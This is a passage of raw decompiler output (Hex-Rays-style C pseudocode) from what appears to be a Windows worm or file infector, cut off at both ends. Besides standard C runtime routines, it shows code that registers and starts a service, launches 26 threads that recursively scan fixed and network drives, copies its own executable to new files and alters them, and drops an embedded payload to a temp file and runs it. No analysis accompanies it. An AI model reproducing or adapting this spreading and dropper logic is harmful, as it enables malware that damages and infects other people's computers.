    v6 = OpenServiceA(v5, Destination, 0x10u);
    StartServiceA(v6, 0, 0);
    CloseServiceHandle(v6);
    CloseServiceHandle(v5);
  }
  return 1;
}
// 4938F0: using guessed type int dword_4938F0;
// 4938F8: using guessed type int dword_4938F8;

//----- (00406F88) --------------------------------------------------------
DWORD __stdcall sub_406F88(LPVOID lpThreadParameter)
{
  UINT v1; // eax
  CHAR RootPathName[4]; // [esp+0h] [ebp-4h] BYREF

  strcpy(RootPathName, "a:\\");
  RootPathName[0] = (_BYTE)lpThreadParameter + dword_4128F0;
  v1 = GetDriveTypeA(RootPathName);
  if ( v1 == 3 || v1 == 4 )
  {
    while ( 1 )
    {
      sub_403F1C(RootPathName, (int)sub_405C7A, 0);
      Sleep(0x1B77400u);
    }
  }
  return 1;
}
// 4128F0: using guessed type int dword_4128F0;

//----- (00406FD5) --------------------------------------------------------
DWORD __stdcall sub_406FD5(LPVOID lpThreadParameter)
{
  char *v1; // eax
  BYTE Data[300]; // [esp+4h] [ebp-258h] BYREF
  CHAR SubKey[300]; // [esp+130h] [ebp-12Ch] BYREF

  sub_407750();
  v1 = sub_40347E(::SubKey, 7);
  strcat(SubKey, v1);
  Data[0] = 0;
  sub_4045EF(HKEY_LOCAL_MACHINE, SubKey, byte_410DF0, Data, (HKEY)0x12C);
  sub_403F1C((char *)Data, (int)sub_405C7A, 0);
  return 0;
}

//----- (0040704C) --------------------------------------------------------
const char *__cdecl sub_40704C(LPCSTR lpFileName, int a2, int a3, int a4)
{
  const char *result; // eax
  unsigned int v6; // eax
  char *v7; // eax
  char v8[4116]; // [esp+10h] [ebp-2590h] BYREF
  char v9; // [esp+1024h] [ebp-157Ch]
  CHAR Filename[260]; // [esp+228Ch] [ebp-314h] BYREF
  char Destination[4]; // [esp+2390h] [ebp-210h] BYREF
  CHAR NewFileName[260]; // [esp+2494h] [ebp-10Ch] BYREF
  int v13; // [esp+2598h] [ebp-8h]
  int v14; // [esp+259Ch] [ebp-4h]
  unsigned int v15; // [esp+25ACh] [ebp+Ch]
  unsigned int v16; // [esp+25ACh] [ebp+Ch]

  v14 = a2;
  v13 = a3;
  if ( a4 || (result = sub_404825(lpFileName)) == 0 )
  {
    v15 = sub_4034AE(&aE, 0);
    if ( a2 < 0 )
      v14 = sub_4047B6(0) % v15;
    v16 = sub_4034AE(a0, 0);
    if ( a3 < 0 )
      v13 = sub_4047B6(0) % v16;
    sub_403E97(NewFileName);
    GetModuleFileNameA(0, Filename, 0x104u);
    result = (const char *)CopyFileA(Filename, NewFileName, 0);
    if ( result )
    {
      SetFileAttributesA(NewFileName, 0x20u);
      sub_407C00((unsigned int)v8, Str1, 0x227Au);
      v9 = 0;
      sub_405705(NewFileName, v8);
      v6 = sub_4047B6(0);
      sub_40406E(NewFileName, v6 % 0x2800 + 86528);
      sub_40347E(&aE, v14);
      sub_407750();
      v7 = sub_40347E(a0, v13);
      strcat(Destination, v7);
      sub_405226(lpFileName, NewFileName, Destination, a4);
      result = (const char *)sub_403F05(NewFileName);
    }
  }
  return result;
}
// 410D74: using guessed type char aE;

//----- (004071C3) --------------------------------------------------------
void __noreturn sub_4071C3()
{
  while ( 1 )
    Sleep(0xFFFFFFFF);
}

//----- (004071CD) --------------------------------------------------------
DWORD __stdcall sub_4071CD(LPVOID lpThreadParameter)
{
  char *v1; // eax
  signed int v2; // eax
  _BYTE *v3; // esi
  HANDLE v4; // eax
  CHAR PathName[260]; // [esp+0h] [ebp-220h] BYREF
  CHAR TempFileName[260]; // [esp+104h] [ebp-11Ch] BYREF
  CHAR PrefixString[20]; // [esp+208h] [ebp-18h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+21Ch] [ebp-4h] BYREF

  sub_40372F(PrefixString, 2, 5, 4);
  PathName[0] = 0;
  v1 = sub_40347E(&aU_0, 1);
  sub_4045EF(HKEY_LOCAL_MACHINE, SubKey, v1, (LPBYTE)PathName, (HKEY)0x104);
  GetTempFileNameA(PathName, PrefixString, 0, TempFileName);
  sub_403F05(TempFileName);
  v2 = strlen(TempFileName);
  do
    --v2;
  while ( v2 >= 0 && TempFileName[v2] != 46 );
  if ( v2 > 0 )
    sub_407750();
  v3 = sub_40756C(dword_411340, 0x15A6u, &nNumberOfBytesToWrite);
  if ( !sub_403DC6(TempFileName, v3, nNumberOfBytesToWrite) )
  {
    sub_403E97(TempFileName);
    sub_403DC6(TempFileName, v3, nNumberOfBytesToWrite);
  }
  v4 = sub_4047E2(TempFileName, 0);
  if ( v4 )
  {
    WaitForSingleObject(v4, 0xFFFFFFFF);
    sub_403F05(TempFileName);
  }
  return 0;
}
// 41096D: using guessed type char aU_0;

//----- (004072F2) --------------------------------------------------------
void __noreturn sub_4072F2()
{
  int i; // ebx
  DWORD ThreadId; // [esp+Ch] [ebp-4h] BYREF

  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_406608, 0, 0, &ThreadId);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_406DDE, 0, 0, &ThreadId);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_406066, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_4071CD, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_406FD5, 0, 0, &ThreadId);
  for ( i = 0; i < 26; ++i )
    CreateThread(0, 0, sub_406F88, (LPVOID)i, 0, &ThreadId);
  sub_4071C3();
}

//----- (0040737C) --------------------------------------------------------
void __stdcall HandlerProc(DWORD dwControl)
{
  struct _SERVICE_STATUS ServiceStatus; // [esp+0h] [ebp-1Ch] BYREF

  ServiceStatus.dwServiceType = 272;
  ServiceStatus.dwControlsAccepted = 0;
  ServiceStatus.dwWin32ExitCode = 0;
  ServiceStatus.dwServiceSpecificExitCode = 0;
  ServiceStatus.dwCheckPoint = 0;
  ServiceStatus.dwWaitHint = 0;
  ServiceStatus.dwCurrentState = 4;
  SetServiceStatus(hServiceStatus, &ServiceStatus);
  if ( sub_404C49() )
    sub_4072F2();
}

//----- (004073C3) --------------------------------------------------------
void __stdcall sub_4073C3(int a1, int a2)
{
  hServiceStatus = RegisterServiceCtrlHandlerA(Destination, HandlerProc);
  HandlerProc(0);
}

//----- (004073E2) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct WSAData WSAData; // [esp+0h] [ebp-1A0h] BYREF
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+190h] [ebp-10h] BYREF
  int v7; // [esp+198h] [ebp-8h]
  int v8; // [esp+19Ch] [ebp-4h]

  WSAStartup(2u, &WSAData);
  if ( sub_4055FE() )
  {
    sub_406DFD();
    if ( !FileName[0] || !sub_405B0F(FileName) )
    {
      if ( dword_4938F8 )
      {
        v7 = 0;
        v8 = 0;
        ServiceStartTable.lpServiceName = Destination;
        ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_4073C3;
        StartServiceCtrlDispatcherA(&ServiceStartTable);
      }
      if ( sub_404C49() )
        sub_4072F2();
    }
  }
  return 0;
}
// 4938F8: using guessed type int dword_4938F8;

//----- (0040745D) --------------------------------------------------------
_DWORD *__cdecl sub_40745D(int a1, size_t a2, size_t *a3)
{
  _BYTE *v3; // ebx
  unsigned int v4; // esi
  size_t v6; // eax
  char *v7; // edi
  char v8; // cl
  size_t v9; // ecx
  _DWORD *v10; // esi
  unsigned int v11; // edi
  size_t v12; // ebx
  char v13[80000]; // [esp+8h] [ebp-1388Ch] BYREF
  _BYTE *v14; // [esp+13888h] [ebp-Ch]
  unsigned int v15; // [esp+1388Ch] [ebp-8h]
  unsigned int v16; // [esp+13890h] [ebp-4h]

  v3 = sub_407F8F(a2);
  v4 = 0;
  v14 = v3;
  v15 = 0;
  v16 = 0;
  if ( !v3 )
    return 0;
  memset(v13, 0, sizeof(v13));
  v6 = 0;
  v7 = &v13[4];
  while ( v6 < a2 )
  {
    do
    {
      v8 = *(_BYTE *)(v6 + a1);
      if ( !v8 )
        break;
      v3[v4++] = v8;
      ++v6;
      v16 = v4;
    }
    while ( v6 < a2 );
    if ( v6 >= a2 )
      break;
    v9 = v6;
    do
    {
      if ( *(_BYTE *)(v9 + a1) )
        break;
      ++v9;
    }
    while ( v9 < a2 );
    if ( v9 - v6 >= 0xA )
    {
      if ( v15 >= 0x2710 )
      {
        v16 = v4;
        v10 = 0;
        goto LABEL_18;
      }
      ++v15;
      *((_DWORD *)v7 - 1) = v6;
      *(_DWORD *)v7 = v9 - v6;
      v7 += 8;
      v6 = v9;
    }
    else
    {
      while ( v6 < v9 )
      {
        v3[v4++] = *(_BYTE *)(v6 + a1);
        ++v6;
      }
    }
  }
  v16 = v4;
  v11 = 2 * v15;
  v12 = 8 * v15 + v4 + 4;
  v10 = sub_407F8F(v12);
  *v10 = v15;
  sub_407C00((unsigned int)(v10 + 1), v13, v11 * 4);
  sub_407C00((unsigned int)&v10[v11 + 1], v14, v16);
  *a3 = v12;
  v3 = v14;
LABEL_18:
  sub_407BEB(v3);
  return v10;
}

//----- (0040756C) --------------------------------------------------------
_BYTE *__cdecl sub_40756C(int *a1, unsigned int a2, size_t *a3)
{
  size_t v4; // edx
  int v5; // edi
  _BYTE *result; // eax
  size_t *v7; // esi
  size_t v8; // ecx
  size_t v9; // eax
  unsigned int v10; // esi
  int v11; // edi
  int v12; // ebx
  unsigned int *v13; // ecx
  unsigned int i; // edx
  unsigned int v15; // ecx
  _BYTE *v16; // esi
  unsigned int *v17; // [esp+Ch] [ebp-Ch]
  int v18; // [esp+10h] [ebp-8h]
  unsigned int v19; // [esp+14h] [ebp-4h]
  unsigned int v20; // [esp+14h] [ebp-4h]
  int v21; // [esp+20h] [ebp+8h]
  unsigned int v22; // [esp+24h] [ebp+Ch]

  v4 = 0;
  v5 = 8 * *a1;
  v19 = 0;
  v17 = (unsigned int *)(a1 + 1);
  v18 = *a1;
  if ( a2 < v5 + 4 )
    return 0;
  if ( *a1 )
  {
    v7 = (size_t *)(a1 + 1);
    v21 = *a1;
    do
    {
      if ( v4 < *v7 )
      {
        v8 = *v7 - v4;
        v4 = *v7;
        v19 += v8;
      }
      v9 = v7[1];
      if ( v9 )
        v4 += v9;
      v7 += 2;
      --v21;
    }
    while ( v21 );
  }
  v22 = a2 - v5 - 4;
  if ( v19 < v22 )
    v4 += v22 - v19;
  v10 = 0;
  v20 = 0;
  *a3 = v4;
  result = sub_407F8F(v4);
  v11 = (int)&a1[v5 / 4u + 1];
  v12 = v18;
  if ( v18 )
  {
    v13 = v17;
    do
    {
      while ( v10 < *v13 )
      {
        result[v10++] = *(_BYTE *)(v20 + v11);
        ++v20;
      }
      for ( i = 0; i < v13[1]; ++i )
        result[v10++] = 0;
      v13 += 2;
      --v12;
    }
    while ( v12 );
  }
  v15 = v20;
  if ( v20 < v22 )
  {
    v16 = &result[v10];
    do
    {
      *v16++ = *(_BYTE *)(v15 + v11);
      ++v15;
    }
    while ( v15 < v22 );
  }
  return result;
}

//----- (00407660) --------------------------------------------------------
int __cdecl strcmp(const char *Str1, const char *Str2)
{
  const char *v2; // edx
  const char *v3; // ecx
  unsigned int v4; // eax
  bool v5; // cf
  unsigned int v6; // eax
  __int16 v8; // ax

  v2 = Str1;
  v3 = Str2;
  if ( ((unsigned __int8)Str1 & 3) == 0 )
  {
LABEL_2:
    while ( 1 )
    {
      v4 = *(_DWORD *)v2;
      v5 = (unsigned __int8)*(_DWORD *)v2 < (unsigned int)*v3;
      if ( (unsigned __int8)*(_DWORD *)v2 != *v3 )
        break;
      if ( !(_BYTE)v4 )
        return 0;
      v5 = BYTE1(v4) < (unsigned int)v3[1];
      if ( BYTE1(v4) != v3[1] )
        break;
      if ( !BYTE1(v4) )
        return 0;
      v6 = HIWORD(v4);
      v5 = (unsigned __int8)v6 < (unsigned int)v3[2];
      if ( (_BYTE)v6 != v3[2] )
        break;
      if ( !(_BYTE)v6 )
        return 0;
      v5 = BYTE1(v6) < (unsigned int)v3[3];
      if ( BYTE1(v6) != v3[3] )
        break;
      v3 += 4;
      v2 += 4;
      if ( !BYTE1(v6) )
        return 0;
    }
    return -2 * v5 + 1;
  }
  if ( ((unsigned __int8)Str1 & 1) != 0 )
  {
    v2 = Str1 + 1;
    v5 = *Str1 < (unsigned int)*Str2;
    if ( *Str1 != *Str2 )
      return -2 * v5 + 1;
    v3 = Str2 + 1;
    if ( !*Str1 )
      return 0;
    if ( ((unsigned __int8)v2 & 2) == 0 )
      goto LABEL_2;
  }
  v8 = *(_WORD *)v2;
  v2 += 2;
  v5 = (unsigned __int8)v8 < (unsigned int)*v3;
  if ( (_BYTE)v8 != *v3 )
    return -2 * v5 + 1;
  if ( !(_BYTE)v8 )
    return 0;
  v5 = HIBYTE(v8) < (unsigned int)v3[1];
  if ( HIBYTE(v8) == v3[1] )
  {
    if ( HIBYTE(v8) )
    {
      v3 += 2;
      goto LABEL_2;
    }
    return 0;
  }
  return -2 * v5 + 1;
}

//----- (004076F0) --------------------------------------------------------
void *__cdecl memset(void *a1, int Val, size_t Size)
{
  size_t v3; // edx
  int v4; // eax
  _BYTE *v5; // edi
  int v6; // ecx
  size_t v7; // ecx
  unsigned int v8; // ecx

  v3 = Size;
  if ( !Size )
    return a1;
  LOBYTE(v4) = Val;
  v5 = a1;
  if ( Size < 4 )
    goto LABEL_13;
  v6 = -(int)a1 & 3;
  if ( v6 )
  {
    v3 = Size - v6;
    do
    {
      *v5++ = Val;
      --v6;
    }
    while ( v6 );
  }
  v4 = 16843009 * (unsigned __int8)Val;
  v7 = v3;
  v3 &= 3u;
  v8 = v7 >> 2;
  if ( !v8 || (memset32(v5, v4, v8), v5 += 4 * v8, v3) )
  {
LABEL_13:
    do
    {
      *v5++ = v4;
      --v3;
    }
    while ( v3 );
  }
  return a1;
}

//----- (00407750) --------------------------------------------------------
void sub_407750()
{
  JUMPOUT(0x4077C1);
}
// 407755: control flows out of bounds to 4077C1

//----- (00407760) --------------------------------------------------------
char *__cdecl strcat(char *Destination, const char *Source)
{
  char *v2; // ecx
  int v4; // eax
  int v5; // eax
  char *v6; // edi
  const char *v7; // ecx
  int v8; // edx
  int v9; // eax
  char *result; // eax

  v2 = Destination;
  if ( ((unsigned __int8)Destination & 3) == 0 )
    goto LABEL_4;
  do
  {
    if ( !*v2++ )
    {
LABEL_9:
      v6 = v2 - 1;
      goto LABEL_13;
    }
  }
  while ( ((unsigned __int8)v2 & 3) != 0 );
  while ( 1 )
  {
    do
    {
LABEL_4:
      v4 = (*(_DWORD *)v2 + 2130640639) ^ ~*(_DWORD *)v2;
      v2 += 4;
    }
    while ( (v4 & 0x81010100) == 0 );
    v5 = *((_DWORD *)v2 - 1);
    if ( !(_BYTE)v5 )
      break;
    if ( !BYTE1(v5) )
    {
      v6 = v2 - 3;
      goto LABEL_13;
    }
    if ( (v5 & 0xFF0000) == 0 )
    {
      v6 = v2 - 2;
      goto LABEL_13;
    }
    if ( (v5 & 0xFF000000) == 0 )
      goto LABEL_9;
  }
  v6 = v2 - 4;
LABEL_13:
  v7 = Source;
  if ( ((unsigned __int8)Source & 3) == 0 )
    goto LABEL_18;
  while ( 1 )
  {
    LOBYTE(v8) = *v7++;
    if ( !(_BYTE)v8 )
      break;
    *v6++ = v8;
    if ( ((unsigned __int8)v7 & 3) == 0 )
    {
      while ( 1 )
      {
LABEL_18:
        v9 = (*(_DWORD *)v7 + 2130640639) ^ ~*(_DWORD *)v7;
        v8 = *(_DWORD *)v7;
        v7 += 4;
        if ( (v9 & 0x81010100) != 0 )
        {
          if ( !(_BYTE)v8 )
            goto LABEL_26;
          if ( !BYTE1(v8) )
          {
            *(_WORD *)v6 = (unsigned __int8)v8;
            return Destination;
          }
          if ( (v8 & 0xFF0000) == 0 )
          {
            *(_WORD *)v6 = v8;
            result = Destination;
            v6[2] = 0;
            return result;
          }
          if ( (v8 & 0xFF000000) == 0 )
          {
            *(_DWORD *)v6 = v8;
            return Destination;
          }
        }
        *(_DWORD *)v6 = v8;
        v6 += 4;
      }
    }
  }
LABEL_26:
  *v6 = v8;
  return Destination;
}

//----- (00407840) --------------------------------------------------------
size_t __cdecl strlen(const char *Str)
{
  const char *v1; // ecx
  int v3; // eax
  int v4; // eax

  v1 = Str;
  if ( ((unsigned __int8)Str & 3) == 0 )
    goto LABEL_4;
  do
  {
    if ( !*v1++ )
      return v1 - 1 - Str;
  }
  while ( ((unsigned __int8)v1 & 3) != 0 );
  while ( 1 )
  {
    do
    {
LABEL_4:
      v3 = (*(_DWORD *)v1 + 2130640639) ^ ~*(_DWORD *)v1;
      v1 += 4;
    }
    while ( (v3 & 0x81010100) == 0 );
    v4 = *((_DWORD *)v1 - 1);
    if ( !(_BYTE)v4 )
      break;
    if ( !BYTE1(v4) )
      return v1 - 3 - Str;
    if ( (v4 & 0xFF0000) == 0 )
      return v1 - 2 - Str;
    if ( (v4 & 0xFF000000) == 0 )
      return v1 - 1 - Str;
  }
  return v1 - 4 - Str;
}

//----- (004078BB) --------------------------------------------------------
void __cdecl _splitpath(const char *FullPath, char *Drive, char *Dir, char *Filename, char *Ext)
{
  const char *v5; // ebx
  char *v6; // eax
  size_t v7; // esi
  unsigned __int8 v8; // cl
  size_t v9; // edi
  size_t v10; // edi
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned __int8 *Source; // [esp+Ch] [ebp-4h]
  const char *FullPatha; // [esp+18h] [ebp+8h]
  char *Drivea; // [esp+1Ch] [ebp+Ch]

  Source = 0;
  v5 = FullPath;
  if ( strlen(FullPath) && FullPath[1] == 58 )
  {
    if ( Drive )
    {
      _mbsnbcpy((unsigned __int8 *)Drive, (const unsigned __int8 *)FullPath, 2u);
      Drive[2] = 0;
    }
    v5 = FullPath + 2;
  }
  else if ( Drive )
  {
    *Drive = 0;
  }
  Drivea = 0;
  v6 = (char *)v5;
  v7 = 255;
  FullPatha = v5;
  if ( !*v5 )
    goto LABEL_23;
  do
  {
    v8 = *v6;
    if ( (byte_494D61[(unsigned __int8)*v6] & 4) != 0 )
    {
      ++v6;
    }
    else if ( v8 == 47 || v8 == 92 )
    {
      Drivea = v6 + 1;
    }
    else if ( v8 == 46 )
    {
      Source = (unsigned __int8 *)v6;
    }
    ++v6;
  }
  while ( *v6 );
  FullPatha = v6;
  if ( Drivea )
  {
    if ( Dir )
    {
      v9 = Drivea - v5;
      if ( (unsigned int)(Drivea - v5) >= 0xFF )
        v9 = 255;
      _mbsnbcpy((unsigned __int8 *)Dir, (const unsigned __int8 *)v5, v9);
      Dir[v9] = 0;
      v6 = (char *)FullPatha;
    }
    v5 = Drivea;
  }
  else
  {
LABEL_23:
    if ( Dir )
      *Dir = 0;
  }
  if ( Source && Source >= (unsigned __int8 *)v5 )
  {
    if ( Filename )
    {
      v10 = Source - (unsigned __int8 *)v5;
      if ( (unsigned int)(Source - (unsigned __int8 *)v5) >= 0xFF )
        v10 = 255;
      _mbsnbcpy((unsigned __int8 *)Filename, (const unsigned __int8 *)v5, v10);
      Filename[v10] = 0;
      v6 = (char *)FullPatha;
    }
    if ( Ext )
    {
      v11 = v6 - (char *)Source;
      if ( v11 < 0xFF )
        v7 = v11;
      _mbsnbcpy((unsigned __int8 *)Ext, Source, v7);
      Ext[v7] = 0;
    }
  }
  else
  {
    if ( Filename )
    {
      v12 = v6 - v5;
      if ( v12 < 0xFF )
        v7 = v12;
      _mbsnbcpy((unsigned __int8 *)Filename, (const unsigned __int8 *)v5, v7);
      Filename[v7] = 0;
    }
    if ( Ext )
      *Ext = 0;
  }
}

//----- (00407A02) --------------------------------------------------------
int __cdecl toupper_0(int C)
{
  int result; // eax
  int v2; // ebx
  int v3; // eax
  int v4; // eax
  unsigned __int16 DestStr; // [esp+4h] [ebp-4h] BYREF

  if ( dword_49393C )
  {
    v2 = C;
    if ( (C >= 256 || (cbMultiByte <= 1 ? (v3 = off_412A10[0][C] & 2) : (v3 = _isctype(C, 2)), v3))
      && (off_412A10[0][BYTE1(v2)] >= 0 ? (LOWORD(C) = (unsigned __int8)v2,
                                           v4 = __crtLCMapStringA(
                                                  dword_49393C,
                                                  0x200u,
                                                  (LPCSTR)&C,
                                                  1,
                                                  (LPSTR)&DestStr,
                                                  3,
                                                  0,
                                                  1)) : (BYTE2(C) = 0,
                                                         LOBYTE(C) = BYTE1(v2),
                                                         BYTE1(C) = v2,
                                                         v4 = __crtLCMapStringA(
                                                                dword_49393C,
                                                                0x200u,
                                                                (LPCSTR)&C,
                                                                2,
                                                                (LPSTR)&DestStr,
                                                                3,
                                                                0,
                                                                1)),
          v4) )
    {
      if ( v4 == 1 )
        result = (unsigned __int8)DestStr;
      else
        result = DestStr;
    }
    else
    {
      result = v2;
    }
  }
  else
  {
    result = C;
    if ( C >= 97 && C <= 122 )
      result = C - 32;
  }
  return result;
}
// 412A10: using guessed type __int16 *off_412A10[2];

//----- (00407ACE) --------------------------------------------------------
int __cdecl tolower_0(int C)
{
  int result; // eax
  int v2; // ebx
  int v3; // eax
  int v4; // eax
  int v5; // eax
  unsigned __int16 DestStr; // [esp+Ch] [ebp-4h] BYREF

  if ( dword_49393C )
  {
    v2 = C;
    if ( (C >= 256 || (cbMultiByte <= 1 ? (v3 = off_412A10[0][C] & 1) : (v3 = _isctype(C, 1)), v3))
      && (off_412A10[0][BYTE1(v2)] >= 0 ? (LOWORD(C) = (unsigned __int8)v2, v4 = 1) : (BYTE2(C) = 0,
                                                                                       LOBYTE(C) = BYTE1(v2),
                                                                                       BYTE1(C) = v2,
                                                                                       v4 = 2),
          (v5 = __crtLCMapStringA(dword_49393C, 0x100u, (LPCSTR)&C, v4, (LPSTR)&DestStr, 3, 0, 1)) != 0) )
    {
      if ( v5 == 1 )
        result = (unsigned __int8)DestStr;
      else
        result = DestStr;
    }
    else
    {
      result = v2;
    }
  }
  else
  {
    result = C;
    if ( C >= 65 && C <= 90 )
      result = C + 32;
  }
  return result;
}
// 412A10: using guessed type __int16 *off_412A10[2];

//----- (00407B99) --------------------------------------------------------
int sprintf(char *const Buffer, const char *const Format, ...)
{
  int v2; // eax
  bool v3; // sf
  int v4; // esi
  FILE v6; // [esp+4h] [ebp-20h] BYREF
  va_list va; // [esp+34h] [ebp+10h] BYREF

  va_start(va, Format);
  v6._base = Buffer;
  v6._ptr = Buffer;
  v6._flag = 66;
  v6._cnt = 0x7FFFFFFF;
  v2 = _output(&v6, (int)Format, (int)va);
  v3 = --v6._cnt < 0;
  v4 = v2;
  if ( v3 )
    _flsbuf(0, &v6);
  else
    *v6._ptr = 0;
  return v4;
}

//----- (00407BEB) --------------------------------------------------------
void __cdecl sub_407BEB(LPVOID lpMem)
{
  free(lpMem);
}

//----- (00407C00) --------------------------------------------------------
unsigned int __cdecl sub_407C00(unsigned int a1, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // esi
  _BYTE *v4; // edi
  unsigned int v5; // ecx
  unsigned int result; // eax
  int v7; // esi
  int v8; // edi
  unsigned int v9; // ecx

  v3 = a2;
  v4 = (_BYTE *)a1;
  if ( a1 > (unsigned int)a2 && a1 < (unsigned int)&a2[a3] )
  {
    v7 = (int)&a2[a3 - 4];
    v8 = a3 + a1 - 4;
    if ( (v8 & 3) == 0 )
    {
      v9 = a3 >> 2;
      if ( a3 >> 2 >= 8 )
      {
        while ( v9 )
        {
          *(_DWORD *)v8 = *(_DWORD *)v7;
          v7 -= 4;
          v8 -= 4;
          --v9;
        }
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_32;
          case 1u:
            goto LABEL_33;
          case 2u:
            goto LABEL_34;
          case 3u:
            goto LABEL_35;
        }
      }
      switch ( a3 & 3 )
      {
        case 0u:
          goto LABEL_32;
        case 1u:
          goto LABEL_33;
        case 2u:
          goto LABEL_34;
        case 3u:
          goto LABEL_35;
      }
    }
    switch ( a3 )
    {
      case 0u:
LABEL_32:
        result = a1;
        break;
      case 1u:
LABEL_33:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        result = a1;
        break;
      case 2u:
LABEL_34:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        *(_BYTE *)(v8 + 2) = *(_BYTE *)(v7 + 2);
        result = a1;
        break;
      case 3u:
LABEL_35:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        *(_BYTE *)(v8 + 2) = *(_BYTE *)(v7 + 2);
        *(_BYTE *)(v8 + 1) = *(_BYTE *)(v7 + 1);
        result = a1;
        break;
      default:
        __asm { jmp     dword ptr ds:loc_407DE4+4[eax*4] }
        return result;
    }
  }
  else
  {
    if ( (a1 & 3) != 0 )
    {
      if ( a3 >= 4 )
        __asm { jmp     dword ptr ds:loc_407C5C+4[eax*4] }
      __asm { jmp     dword ptr ds:loc_407D58[ecx*4]; jumptable 00407C35 case 0 }
    }
    v5 = a3 >> 2;
    switch ( v5 )
    {
      case 0u:
        goto LABEL_17;
      case 1u:
        goto LABEL_16;
      case 2u:
        goto LABEL_15;
      case 3u:
        goto LABEL_14;
      case 4u:
        goto LABEL_13;
      case 5u:
        goto LABEL_12;
      case 6u:
        goto LABEL_11;
      case 7u:
        *(_DWORD *)(a1 + 4 * v5 - 28) = *(_DWORD *)&a2[4 * v5 - 28];
LABEL_11:
        *(_DWORD *)(a1 + 4 * v5 - 24) = *(_DWORD *)&a2[4 * v5 - 24];
LABEL_12:
        *(_DWORD *)(a1 + 4 * v5 - 20) = *(_DWORD *)&a2[4 * v5 - 20];
LABEL_13:
        *(_DWORD *)(a1 + 4 * v5 - 16) = *(_DWORD *)&a2[4 * v5 - 16];
LABEL_14:
        *(_DWORD *)(a1 + 4 * v5 - 12) = *(_DWORD *)&a2[4 * v5 - 12];
LABEL_15:
        *(_DWORD *)(a1 + 4 * v5 - 8) = *(_DWORD *)&a2[4 * v5 - 8];
LABEL_16:
        *(_DWORD *)(a1 + 4 * v5 - 4) = *(_DWORD *)&a2[4 * v5 - 4];
        v3 = &a2[4 * v5];
        v4 = (_BYTE *)(4 * v5 + a1);
LABEL_17:
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_18;
          case 1u:
            goto LABEL_19;
          case 2u:
            goto LABEL_20;
          case 3u:
            goto LABEL_21;
        }
      default:
        qmemcpy((void *)a1, a2, 4 * v5);
        v3 = &a2[4 * v5];
        v4 = (_BYTE *)(a1 + 4 * v5);
        switch ( a3 & 3 )
        {
          case 0u:
LABEL_18:
            result = a1;
            break;
          case 1u:
LABEL_19:
            *v4 = *v3;
            result = a1;
            break;
          case 2u:
LABEL_20:
            *v4 = *v3;
            v4[1] = v3[1];
            result = a1;
            break;
          case 3u:
LABEL_21:
            *v4 = *v3;
            v4[1] = v3[1];
            v4[2] = v3[2];
            result = a1;
            break;
        }
        break;
    }
  }
  return result;
}

//----- (00407F35) --------------------------------------------------------
int __cdecl sub_407F35(int a1)
{
  int result; // eax

  result = a1;
  dword_412900 = a1;
  return result;
}
// 412900: using guessed type int dword_412900;

//----- (00407F3F) --------------------------------------------------------
int sub_407F3F()
{
  dword_412900 = 214013 * dword_412900 + 2531011;
  return (dword_412900 >> 16) & 0x7FFF;
}
// 412900: using guessed type int dword_412900;

//----- (00407F8F) --------------------------------------------------------
void *__cdecl sub_407F8F(size_t a1)
{
  return _nh_malloc(a1, 1);
}

//----- (00407F9D) --------------------------------------------------------
int sscanf(const char *const Buffer, const char *const Format, ...)
{
  FILE v3; // [esp+0h] [ebp-20h] BYREF
  va_list va; // [esp+30h] [ebp+10h] BYREF

  va_start(va, Format);
  v3._flag = 73;
  v3._base = (char *)Buffer;
  v3._ptr = (char *)Buffer;
  v3._cnt = strlen(Buffer);
  return _input(&v3, (int)Format, (int)va);
}

//----- (00407FE0) --------------------------------------------------------
unsigned int __cdecl sub_407FE0(unsigned int a1, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // esi
  _BYTE *v4; // edi
  unsigned int v5; // ecx
  unsigned int result; // eax
  int v7; // esi
  int v8; // edi
  unsigned int v9; // ecx

  v3 = a2;
  v4 = (_BYTE *)a1;
  if ( a1 > (unsigned int)a2 && a1 < (unsigned int)&a2[a3] )
  {
    v7 = (int)&a2[a3 - 4];
    v8 = a3 + a1 - 4;
    if ( (v8 & 3) == 0 )
    {
      v9 = a3 >> 2;
      if ( a3 >> 2 >= 8 )
      {
        while ( v9 )
        {
          *(_DWORD *)v8 = *(_DWORD *)v7;
          v7 -= 4;
          v8 -= 4;
          --v9;
        }
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_32;
          case 1u:
            goto LABEL_33;
          case 2u:
            goto LABEL_34;
          case 3u:
            goto LABEL_35;
        }
      }
      switch ( a3 & 3 )
      {
        case 0u:
          goto LABEL_32;
        case 1u:
          goto LABEL_33;
        case 2u:
          goto LABEL_34;
        case 3u:
          goto LABEL_35;
      }
    }
    switch ( a3 )
    {
      case 0u:
LABEL_32:
        result = a1;
        break;
      case 1u:
LABEL_33:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        result = a1;
        break;
      case 2u:
LABEL_34:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        *(_BYTE *)(v8 + 2) = *(_BYTE *)(v7 + 2);
        result = a1;
        break;
      case 3u:
LABEL_35:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        *(_BYTE *)(v8 + 2) = *(_BYTE *)(v7 + 2);
        *(_BYTE *)(v8 + 1) = *(_BYTE *)(v7 + 1);
        result = a1;
        break;
      default:
        __asm { jmp     dword ptr ds:loc_4081C4+4[eax*4] }
        return result;
    }
  }
  else
  {
    if ( (a1 & 3) != 0 )
    {
